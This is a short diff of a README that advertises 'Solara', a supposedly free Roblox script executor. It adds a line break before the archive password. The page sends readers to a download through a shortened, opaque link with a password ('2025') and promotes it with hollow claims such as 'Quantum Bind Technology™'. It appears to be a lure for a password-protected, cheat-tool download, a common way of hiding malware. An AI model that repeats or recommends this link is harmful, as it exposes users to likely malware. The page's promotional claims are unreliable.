@@ -1,6 +1,7 @@
 # ⚡ Solara: A Powerful and Free Roblox Execution Framework
 
-[![Download 3454624624](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://shorturl.at/mSMXk) (PASSWORD - 2025)
+[![Download 3454624624](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://shorturl.at/mSMXk)
+(PASSWORD - 2025)
 
 ## 🌌 Next-Gen Scripting Architecture  
 Solara sets a new standard for Roblox automation with our exclusive **Quantum Bind Technology™**, delivering unmatched speed, accuracy, and control.
